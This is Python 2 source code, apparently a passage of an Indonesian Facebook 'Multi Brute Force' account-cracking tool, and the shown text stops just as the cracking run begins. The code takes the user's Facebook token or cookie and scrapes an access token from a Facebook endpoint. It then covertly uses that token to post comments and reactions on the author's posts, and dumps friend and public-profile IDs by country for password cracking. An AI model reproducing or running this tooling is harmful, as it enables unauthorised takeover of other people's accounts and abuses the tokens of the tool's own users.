M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m'
O = '\x1b[1;96m'
my_color = [
 P, M, H, K, B, U, O]
warna = random.choice(my_color)
warni = random.choice(my_color)
try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')

try:
    import requests
except ImportError:
    os.system('pip2 install requests')
    os.system('python2 Crackv1.py')

from requests.exceptions import ConnectionError
from mechanize import Browser
from datetime import datetime
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
os.system('clear')
done = False

def animate():
    for c in itertools.cycle(['\x1b[1;91m.', '\x1b[1;94m.', '\x1b[1;91m.', '\x1b[1;94m.']):
        if done:
            break
        sys.stdout.write('\r\x1b[1;94mLoading ' + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c)
        sys.stdout.flush()
        time.sleep(0.1)


t = threading.Thread(target=animate)
t.start()
time.sleep(5)
done = True

def keluar():
    print '\x1b[1;97m(\x1b[1;91m!\x1b[1;97m) Keluar'
    os.sys.exit()


def acak(x):
    w = 'mhkbpcP'
    d = ''
    for i in x:
        d += '!' + w[random.randint(0, len(w) - 1)] + i

    return cetak(d)


def cetak(x):
    w = 'mhkbpcP'
    for i in w:
        j = w.index(i)
        x = x.replace('!%s' % i, '%s;' % str(31 + j))

    x += ''
    x = x.replace('!0', '')
    sys.stdout.write(x + '\n')


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)


logo = '\n\x1b[1;94m _________   ________.    \n\x1b[1;94m \\_   ___ \\_/ ____\\_ |__   \x1b[1;97m(\x1b[1;94m M\x1b[1;97m )\x1b[1;94m > \x1b[1;97mMulti \n\x1b[1;94m /    \\  \\/\\   __\\ | __ \\  \x1b[1;97m(\x1b[1;94m B\x1b[1;97m )\x1b[1;94m > \x1b[1;97mBrute\n\x1b[1;94m \\     \\____|  |   | \\_\\ \\ \x1b[1;97m(\x1b[1;94m F\x1b[1;97m )\x1b[1;94m > \x1b[1;97mForce\n\x1b[1;94m  \\______  /|__|   |___  /\n\x1b[1;94m         \\/            \\/    \x1b[1;93m`\x1b[1;92m_/==\\_\x1b[1;93m`\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;97mAuthor   \x1b[1;94m\xe2\x80\xa2 \x1b[1;97mAris Widiatmoko  \x1b[1;92m(\xc2\xb0\x1b[1;97m \xcd\x9c\x1b[1;92m\xca\x96\x1b[1;92m\xc2\xb0)\x1b[1;94m\xe2\x96\x84\xef\xb8\xbb\xcc\xb7\xcc\xbf\xe2\x94\xbb\xcc\xbf\xe2\x95\x90\xe2\x94\x81\xe4\xb8\x80\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;97mFacebook \x1b[1;94m\xe2\x80\xa2 \x1b[1;97mAris Widiatmoko   \x1b[1;92m/`>    \x1b[1;97m\n(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;97mWhatsAp  \x1b[1;94m\xe2\x80\xa2 \x1b[1;97m0813-1649-8757\n\x1b[1;94m\xe2\x94\x80\xe2\x80\xa2\xe2\x94\x80\xe2\x80\xa2\xe2\x94\x80\xe2\x80\xa2\xe2\x94\x80\xe2\x80\xa2\xe2\x94\x80\xe2\x80\xa2\xe2\x94\x80\xe2\x80\xa2\xe2\x94\x80\xe2\x80\xa2\xe2\x94\x80\xe2\x80\xa2\xe2\x94\x80\xe2\x80\xa2\xe2\x94\x80\xe2\x80\xa2\xe2\x94\x80\xe2\x80\xa2\xe2\x94\x80\xe2\x80\xa2\xe2\x94\x80\xe2\x80\xa2\xe2\x94\x80\xe2\x80\xa2\xe2\x94\x80\xe2\x80\xa2\xe2\x94\x80\xe2\x80\xa2\xe2\x94\x80\xe2\x80\xa2\xe2\x94\x80\xe2\x80\xa2\xe2\x94\x80\xe2\x80\xa2\xe2\x94\x80\xe2\x80\xa2\xe2\x94\x80\xe2\x80\xa2\xe2\x94\x80\xe2\x80\xa2\xe2\x94\x80\xe2\x80\xa2\xe2\x94\x80\xe2\x80\xa2\xe2\x94\x80\n\x1b[1;94m\xe2\x80\xa2\x1b[1;97mJangan Lupa Kunjungi Kami!\n\x1b[1;94m\xe2\x80\xa2\x1b[1;97mAuthor : \xf0\x9f\x92\x9c Aris Widiatmoko\xf0\x9f\x92\x9c\n\x1b[1;94m\xe2\x80\xa2\x1b[1;97mGroup Telegram : t.me/ijaksshop\n\x1b[1;94m\xe2\x80\xa2\x1b[1;97mTeam   : IJAKS PROJECT '
logo2 = '\n\x1b[1;95m     ____ \n\x1b[1;95m    / __ \\__  ______ ___  ____  \x1b[1;97m[\x1b[1;94m M\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mMulti \n\x1b[1;95m   / / / / / / / __ `__ \\/ __ \\ \x1b[1;97m[\x1b[1;94m B\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mBrute \n\x1b[1;95m  / /_/ / /_/ / / / / / / /_/ / \x1b[1;97m[\x1b[1;94m F\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mForce \n\x1b[1;95m /_____/\\__,_/_/ /_/ /_/ .___/ \n\x1b[1;95m                      /_/      \n '
logo3 = '\n\x1b[1;95m \xe2\x95\xa6 \xe2\x95\xa6\xe2\x94\x8c\xe2\x94\x80\xe2\x94\x90\xe2\x94\x8c\xe2\x94\x80\xe2\x94\x90\xe2\x94\xac\xe2\x94\xac    \xe2\x94\x8c\xe2\x94\x80\xe2\x94\x90\xe2\x94\xac\xe2\x94\x80\xe2\x94\x90\xe2\x94\x8c\xe2\x94\x80\xe2\x94\x90\xe2\x94\x8c\xe2\x94\x80\xe2\x94\x90\xe2\x94\xac\xe2\x94\x8c\xe2\x94\x80 \x1b[1;97m[\x1b[1;94m M\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mMulti \n\x1b[1;95m \xe2\x95\xa0\xe2\x95\x90\xe2\x95\xa3\xe2\x94\x9c\xe2\x94\x80\xe2\x94\xa4\xe2\x94\x94\xe2\x94\x80\xe2\x94\x90\xe2\x94\x82\xe2\x94\x82    \xe2\x94\x82  \xe2\x94\x9c\xe2\x94\xac\xe2\x94\x98\xe2\x94\x9c\xe2\x94\x80\xe2\x94\xa4\xe2\x94\x82  \xe2\x94\x9c\xe2\x94\xb4\xe2\x94\x90 \x1b[1;97m[\x1b[1;94m B\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mBrute \n\x1b[1;95m \xe2\x95\xa9 \xe2\x95\xa9\xe2\x94\xb4 \xe2\x94\xb4\xe2\x94\x94\xe2\x94\x80\xe2\x94\x98\xe2\x94\xb4\xe2\x94\xb4\xe2\x94\x80\xe2\x94\x98  \xe2\x94\x94\xe2\x94\x80\xe2\x94\x98\xe2\x94\xb4\xe2\x94\x94\xe2\x94\x80\xe2\x94\xb4 \xe2\x94\xb4\xe2\x94\x94\xe2\x94\x80\xe2\x94\x98\xe2\x94\xb4 \xe2\x94\xb4 \x1b[1;97m[\x1b[1;94m F\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mForce \n '
back = 0
threads = []
berhasil = []
cekpoint = []
oks = []
oke = []
id = []
idteman = []
idfromteman = []

def masuk():
    os.system('clear')
    print logo
    print 50 * '\x1b[1;94m\xe2\x94\x80'
    print '\x1b[1;97m(\x1b[1;97m1\x1b[1;97m) Login Via Token Facebook'
    print '\x1b[1;97m(\x1b[1;97m2\x1b[1;97m) Login Via Cookie Facebook'
    print '\x1b[1;97m(\x1b[1;97m3\x1b[1;97m) Cara Ambil Cookie Facebook'
    print '\x1b[1;97m(\x1b[1;91m0\x1b[1;97m) Keluar'
    print 50 * '\x1b[1;94m\xe2\x94\x80'
    pilih_masuk()


def pilih_masuk():
    msuk = raw_input('\x1b[1;97m(?) Pilih \x1b[94m>\x1b[1;97m ')
    if msuk == '':
        print '\x1b[1;97m(\x1b[1;91m!\x1b[1;97m) Isi Yg Benar Sayang!'
        pilih_masuk()
    elif msuk == '1' or msuk == '01':
        tokenz()
    elif msuk == '2' or msuk == '02':
        cookie()
    elif msuk == '3' or msuk == '03':
        ambil_cookie()
    elif msuk == '0' or msuk == '00':
        keluar()
    else:
        print '\x1b[1;97m(\x1b[1;91m!\x1b[1;97m) Isi Yg Benar Sayang!'
        pilih_masuk()


def tokenz():
    os.system('clear')
    print logo
    print 50 * '\x1b[1;94m\xe2\x94\x80'
    toket = raw_input('\x1b[1;97m(?) Token \x1b[94m>\x1b[1;97m ')
    try:
        otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
        a = json.loads(otw.text)
        zedd = open('login.txt', 'w')
        zedd.write(toket)
        zedd.close()
        print ' '
        jalan('\x1b[1;97m(\x1b[1;92m\xe2\x9c\x93\x1b[1;97m)\x1b[1;92m Login Berhasil ! ')
        os.system('xdg-open ')
        bot_komen()
    except KeyError:
        print '\x1b[1;97m(\x1b[1;91m!\x1b[1;97m) Token salah !'
        time.sleep(1.7)
        masuk()


def cookie():
    os.system('clear')
    print logo
    print 50 * '\x1b[1;94m\xe2\x94\x80'
    cookie = raw_input('\x1b[1;97m(?) Cookie \x1b[94m>\x1b[1;97m ')
    try:
        data = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers={'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36', 
           'referer': 'https://m.facebook.com/', 
           'host': 'm.facebook.com', 
           'origin': 'https://m.facebook.com', 
           'upgrade-insecure-requests': '1', 
           'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 
           'cache-control': 'max-age=0', 
           'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 
           'content-type': 'text/html; charset=utf-8'}, cookies={'cookie': cookie})
        find_token = re.search('(EAAA\\w+)', data.text)
        hasil = '\n* Fail : maybe your cookie invalid !!' if find_token is None else '\n* Your fb access token : ' + find_token.group(1)
    except requests.exceptions.ConnectionError:
        print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] No Connection'

    cookie = open('login.txt', 'w')
    cookie.write(find_token.group(1))
    cookie.close()
    print ' '
    jalan('\x1b[1;97m(\x1b[1;92m\xe2\x9c\x93\x1b[1;97m)\x1b[1;92m Login Berhasil ! ')
    os.system('xdg-open ')
    bot_komen()
    time.sleep(2)
    menu()
    return


def bot_komen():
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;97m(\x1b[1;91m!\x1b[1;97m) Token invalid'
        os.system('rm -rf login.txt')

    kom = 'Saya Penguna sc abang 🔥 \xf0\x9f\x98\x98'
    reac = 'LOVE'
    post = '2880834122134254'
    post2 = '2880834122134254'
    kom2 = 'Mantap Bang Work 😬 \xf0\x9f\x98\x81'
    reac2 = 'LOVE'
    requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/' + post + '/reactions?type=' + reac + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/' + post2 + '/comments/?message=' + kom2 + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/' + post2 + '/reactions?type=' + reac2 + '&access_token=' + toket)
    menu()


def menu():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;97m(\x1b[1;91m!\x1b[1;97m) Token invalid'
        os.system('clear')
        os.system('rm -rf login.txt')
        masuk()

    try:
        otw = requests.get('https://graph.facebook.com/me/?access_token=' + toket)
        a = json.loads(otw.text)
        nama = a['name']
        id = a['id']
    except KeyError:
        os.system('clear')
        print '\x1b[1;97m(\x1b[1;91m!\x1b[1;97m) Token invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        masuk()
        time.sleep(1)
        masuk()
    except requests.exceptions.ConnectionError:
        print '\x1b[1;97m(\x1b[1;91m!\x1b[1;97m) Tidak ada koneksi'
        keluar()

    os.system('clear')
    print ' '
    print '\x1b[1;94m _________   ________.    '
    print '\x1b[1;94m \\_   ___ \\_/ ____\\_ |__   \x1b[1;97m[\x1b[1;94m M\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mMulti'
    print '\x1b[1;94m /    \\  \\/\\   __\\ | __ \\  \x1b[1;97m[\x1b[1;94m B\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mBrute'
    print '\x1b[1;94m \\     \\____|  |   | \\_\\ \\ \x1b[1;97m[\x1b[1;94m F\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mForce'
    print '\x1b[1;94m  \\______  /|__|   |___  /'
    print '\x1b[1;94m         \\/            \\/ '
    print 50 * '\x1b[1;94m\xe2\x94\x80'
    print '\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\x1b[1;97m(\x1b[1;93mInformasi Profil Anda\x1b[1;97m)\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    print 50 * '\x1b[1;94m\xe2\x94\x80'
    jalan('\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m)\x1b[1;97m Nama Akun\x1b[1;97m :\x1b[1;97m ' + nama)
    jalan('\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m)\x1b[1;97m User Id\x1b[1;97m   :\x1b[1;97m ' + id)
    jalan('\x1b[0;97m(\x1b[0;94m\xe2\x80\xa2\x1b[0;97m)\x1b[0;97m Tanggal Lahir\x1b[0;97m :\x1b[0;97m ' + a['birthday'])
    print 50 * '\x1b[1;94m\xe2\x94\x80'
    print '\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\x1b[1;97m(\x1b[1;93mMenu\x1b[1;97m)\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    print 50 * '\x1b[1;94m\xe2\x94\x80'
    print '\x1b[1;94m(\x1b[1;97m1\x1b[1;94m) \x1b[1;97mPilih Negara '
    print '\x1b[1;94m(\x1b[1;97m2\x1b[1;94m) \x1b[1;97mCrack ID Dari Postingan Teman/Publik'
    print '\x1b[1;94m(\x1b[1;97m3\x1b[1;94m) \x1b[1;97mCrack ID Dari Total Followers'
    print '\x1b[1;94m(\x1b[1;97m4\x1b[1;94m)\x1b[1;97m Cari ID menggunakan username'
    print '\x1b[1;94m(\x1b[1;97m5\x1b[1;94m) \x1b[1;97mDump ID'
    print '\x1b[1;94m(\x1b[1;97m6\x1b[1;94m) \x1b[1;97mLihat Hasil Crack'
    print '\x1b[1;94m(\x1b[1;97m7\x1b[1;94m) \x1b[1;97mFollow My Facebook'
    print '\x1b[1;94m(\x1b[1;97m8\x1b[1;94m)\x1b[1;97m Perbarui Script'
    print '\x1b[1;94m(\x1b[1;91m0\x1b[1;94m)\x1b[1;97m Keluar'
    print 50 * '\x1b[1;94m\xe2\x94\x80'
    pilih()


def pilih():
    unikers = raw_input('\x1b[1;97m(?) Pilih \x1b[94m>\x1b[1;97m ')
    if unikers == '':
        print '\x1b[1;97m(\x1b[1;91m!\x1b[1;97m) Isi Yg Benar Sayang!'
        pilih()
    elif unikers == '1' or unikers == '01':
        crack_teman()
    elif unikers == '2' or unikers == '02':
        crack_likes()
    elif unikers == '3' or unikers == '03':
        crack_follow()
    elif unikers == '4' or unikers == '04':
        user_id()
    elif unikers == '5' or unikers == '05':
        dump()
    elif unikers == '6' or unikers == '06':
        lihat_hasil()
    elif unikers == '7' or unikers == '07':
        follow()
    elif unikers == '8' or unikers == '08':
        perbarui()
    elif unikers == '0' or unikers == '00':
        os.system('clear')
        jalan('Keluar')
        os.system('rm -rf login.txt')
        keluar()
    else:
        print '\x1b[1;97m(\x1b[1;91m!\x1b[1;97m) Isi Yg Benar Sayang!'
        pilih()


def crack_teman():
    os.system('clear')
    print ' '
    print '\x1b[1;94m _________   ________.    '
    print '\x1b[1;94m \\_   ___ \\_/ ____\\_ |__   \x1b[1;97m[\x1b[1;94m M\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mMulti'
    print '\x1b[1;94m /    \\  \\/\\   __\\ | __ \\  \x1b[1;97m[\x1b[1;94m B\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mBrute'
    print '\x1b[1;94m \\     \\____|  |   | \\_\\ \\ \x1b[1;97m[\x1b[1;94m F\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mForce'
    print '\x1b[1;94m  \\______  /|__|   |___  /'
    print '\x1b[1;94m         \\/            \\/ '
    print 50 * '\x1b[1;94m\xe2\x94\x80'
    print '\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\x1b[1;97m(\x1b[1;93mPilih Negara\x1b[1;97m)\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    print 50 * '\x1b[1;94m\xe2\x94\x80'
    print '\x1b[1;94m(\x1b[1;97m1\x1b[1;94m)\x1b[1;97m Crack ID Indonesia'
    print '\x1b[1;94m(\x1b[1;97m2\x1b[1;94m) \x1b[1;97mCrack ID Bangladesh'
    print '\x1b[1;94m(\x1b[1;97m3\x1b[1;94m) \x1b[1;97mCrack ID Usa'
    print '\x1b[1;94m(\x1b[1;97m4\x1b[1;94m)\x1b[1;97m Crack ID Pakistan & India'
    print '\x1b[1;94m(\x1b[1;97m5\x1b[1;94m) \x1b[1;97mCrack ID Malaysia'
    print '\x1b[1;94m(\x1b[1;97m6\x1b[1;94m) \x1b[1;97mCrack ID Thailand'
    print '\x1b[1;94m(\x1b[1;97m7\x1b[1;94m) \x1b[1;97mCrack ID Korea'
    print '\x1b[1;94m(\x1b[1;97m8\x1b[1;94m) \x1b[1;97mCrack ID Japan (Kakek Sugiono)'
    print '\x1b[1;94m(\x1b[1;97m9\x1b[1;94m)\x1b[1;97m Crack ID Singapura'
    print '\x1b[1;94m(\x1b[1;97m10\x1b[1;94m) \x1b[1;97mCrack ID Vietnam'
    print '\x1b[1;94m(\x1b[1;97m11\x1b[1;94m) \x1b[1;97mCrack ID Israel'
    print '\x1b[1;94m(\x1b[1;97m12\x1b[1;94m) \x1b[1;97mCrack ID Fhilipina'
    print '\x1b[1;94m(\x1b[1;97m13\x1b[1;94m) \x1b[1;97mCrack ID Prancis'
    print '\x1b[1;94m(\x1b[1;97m14\x1b[1;94m) \x1b[1;97mCrack ID Turky'
    print '\x1b[1;94m(\x1b[1;97m15\x1b[1;94m) \x1b[1;97mCrack ID Saudi Arabia'
    print '\x1b[1;94m(\x1b[1;91m0\x1b[1;94m) \x1b[1;97mKembali'
    print 50 * '\x1b[1;94m\xe2\x94\x80'
    pilih_teman()


def pilih_teman():
    univ = raw_input('\x1b[1;97m(?) Pilih \x1b[94m>\x1b[1;97m ')
    if univ == '':
        print '\x1b[1;97m(\x1b[1;91m!\x1b[1;97m) Isi Yg Benar Sayang!'
        pilih_teman()
    elif univ == '1' or univ == '01':
        crack_indo()
    elif univ == '2' or univ == '02':
        crack_bangla()
    elif univ == '3' or univ == '03':
        crack_usa()
    elif univ == '4' or univ == '04':
        crack_pakis()
    elif univ == '5' or univ == '05':
        crack_malay()
    elif univ == '6' or univ == '06':
        crack_thai()
    elif univ == '7' or univ == '07':
        crack_korea()
    elif univ == '8' or univ == '08':
        crack_japan()
    elif univ == '9' or univ == '09':
        crack_singa()
    elif univ == '10' or univ == '10':
        crack_viet()
    elif univ == '11' or univ == '11':
        crack_israel()
    elif univ == '12' or univ == '12':
        crack_fhilip()
    elif univ == '13' or univ == '13':
        crack_prancis()
    elif univ == '14' or univ == '14':
        crack_turkey()
    elif univ == '15' or univ == '15':
        crack_saudi()
    elif univ == '0' or univ == '00':
        menu()
    else:
        print '\x1b[1;97m(\x1b[1;91m!\x1b[1;97m) Isi Yg Benar Sayang!'
        pilih_teman()


def crack_indo():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;97m(\x1b[1;91m!\x1b[1;97m) Token invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        keluar()

    os.system('clear')
    print ' '
    print '\x1b[1;91m _________   ________.    '
    print '\x1b[1;91m \\_   ___ \\_/ ____\\_ |__   \x1b[1;97m[\x1b[1;94m M\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mMulti'
    print '\x1b[1;91m /    \\  \\/\\   __\\ | __ \\  \x1b[1;97m[\x1b[1;94m B\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mBrute'
    print '\x1b[1;97m \\     \\____|  |   | \\_\\ \\ \x1b[1;97m[\x1b[1;94m F\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mForce'
    print '\x1b[1;97m  \\______  /|__|   |___  /'
    print '\x1b[1;97m         \\/            \\/ '
    print 50 * '\x1b[1;94m\xe2\x94\x80'
    print '\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\x1b[1;97m(\x1b[1;93mIndonesia\x1b[1;97m)\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    print 50 * '\x1b[1;94m\xe2\x94\x80'
    print '\x1b[1;94m(\x1b[1;97m1\x1b[1;94m) \x1b[1;97mCrack Dari Daftar Teman'
    print '\x1b[1;94m(\x1b[1;97m2\x1b[1;94m)\x1b[1;97m Crack Dari Id Teman/Publik'
    print '\x1b[1;94m(\x1b[1;97m3\x1b[1;94m)\x1b[1;97m Crack Dari File'
    print '\x1b[1;94m(\x1b[1;91m0\x1b[1;94m) \x1b[1;97mKembali'
    print 50 * '\x1b[1;94m\xe2\x94\x80'
    pilih_indo()


def pilih_indo():
    global cekpoint
    global oks
    teak = raw_input('\x1b[1;97m(?) Pilih \x1b[94m> \x1b[1;97m ')
    if teak == '':
        print '\x1b[1;97m(\x1b[1;91m!\x1b[1;97m) Isi Yg Benar Sayang!'
        pilih_indo()
    else:
        if teak == '1' or teak == '01':
            os.system('clear')
            print ' '
            print '\x1b[1;91m _________   ________.    '
            print '\x1b[1;91m \\_   ___ \\_/ ____\\_ |__   \x1b[1;97m[\x1b[1;94m M\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mMulti'
            print '\x1b[1;91m /    \\  \\/\\   __\\ | __ \\  \x1b[1;97m[\x1b[1;94m B\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mBrute'
            print '\x1b[1;97m \\     \\____|  |   | \\_\\ \\ \x1b[1;97m[\x1b[1;94m F\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mForce'
            print '\x1b[1;97m  \\______  /|__|   |___  /'
            print '\x1b[1;97m         \\/            \\/ '
            print 50 * '\x1b[1;94m\xe2\x94\x80'
            print '             \x1b[1;94m>>> \x1b[1;93mCRACK INDONESIA \x1b[1;94m<<<'
            print 50 * '\x1b[1;94m\xe2\x94\x80'
            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
            z = json.loads(r.text)
            for s in z['data']:
                id.append(s['id'])

        elif teak == '2' or teak == '02':
            os.system('clear')
            print ' '
            print '\x1b[1;91m _________   ________.    '
            print '\x1b[1;91m \\_   ___ \\_/ ____\\_ |__   \x1b[1;97m[\x1b[1;94m M\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mMulti'
            print '\x1b[1;91m /    \\  \\/\\   __\\ | __ \\  \x1b[1;97m[\x1b[1;94m B\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mBrute'
            print '\x1b[1;97m \\     \\____|  |   | \\_\\ \\ \x1b[1;97m[\x1b[1;94m F\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mForce'
            print '\x1b[1;97m  \\______  /|__|   |___  /'
            print '\x1b[1;97m         \\/            \\/ '
            print 50 * '\x1b[1;94m\xe2\x94\x80'
            print '             \x1b[1;94m>>> \x1b[1;93mCRACK INDONESIA \x1b[1;94m<<<'
            print 50 * '\x1b[1;94m\xe2\x94\x80'
            idt = raw_input('\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) ID Publik \x1b[1;91m:\x1b[1;97m ')
            try:
                pok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
                sp = json.loads(pok.text)
                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama Akun \x1b[1;91m:\x1b[1;97m ' + sp['name']
            except KeyError:
                print '\x1b[1;97m(\x1b[1;91m!\x1b[1;97m) ID publik Tidak Ada!'
                raw_input('\n\x1b[1;97m(\x1b[1;91mKembali\x1b[1;97m)')
                crack_indo()
            except requests.exceptions.ConnectionError:
                print '\x1b[1;97m(\x1b[1;91m!\x1b[1;97m) Tidak ada koneksi !'
                keluar()

            r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
            z = json.loads(r.text)
            for i in z['data']:
                id.append(i['id'])

        elif teak == '3' or teak == '03':
            os.system('clear')
            print ' '
            print '\x1b[1;91m _________   ________.    '
            print '\x1b[1;91m \\_   ___ \\_/ ____\\_ |__   \x1b[1;97m[\x1b[1;94m M\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mMulti'
            print '\x1b[1;91m /    \\  \\/\\   __\\ | __ \\  \x1b[1;97m[\x1b[1;94m B\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mBrute'
            print '\x1b[1;97m \\     \\____|  |   | \\_\\ \\ \x1b[1;97m[\x1b[1;94m F\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mForce'
            print '\x1b[1;97m  \\______  /|__|   |___  /'
            print '\x1b[1;97m         \\/            \\/ '
            try:
                print 50 * '\x1b[1;94m\xe2\x94\x80'
                print '             \x1b[1;94m>>> \x1b[1;93mCRACK INDONESIA \x1b[1;94m<<<'
                print 50 * '\x1b[1;94m\xe2\x94\x80'
                idlist = raw_input('\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;97mNama File\x1b[1;91m :\x1b[1;97m ')
                for line in open(idlist, 'r').readlines():
                    id.append(line.strip())

            except KeyError:
                print '\x1b[1;97m(\x1b[1;91m!\x1b[1;97m) File tidak ada ! '
                raw_input('\n\x1b[1;97m(\x1b[1;91mKembali \x1b[1;97m)')
            except IOError:
                print '\x1b[1;97m(\x1b[1;91m!\x1b[1;97m) File tidak ada !'
                raw_input('\n\x1b[1;97m(\x1b[1;91mKembali\x1b[1;97m)')
                crack_indo()

        elif teak == '0' or teak == '00':
            menu()
        else:
            print '\x1b[1;97m(\x1b[1;91m!\x1b[1;97m) Isi Yg Benar Sayang!'
            pilih_indo()
        print '\x1b[0;97m(\x1b[0;94m\xe2\x80\xa2\x1b[0;97m) Total ID\x1b[1;91m  :\x1b[1;97m ' + str(len(id))
        titik = ['.   ', '..  ', '... ']
        for o in titik:
            print '\r\x1b[0;97m(\x1b[0;94m\xe2\x80\xa2\x1b[0;97m) Crack Berjalan ' + o,
            sys.stdout.flush()
            time.sleep(1)

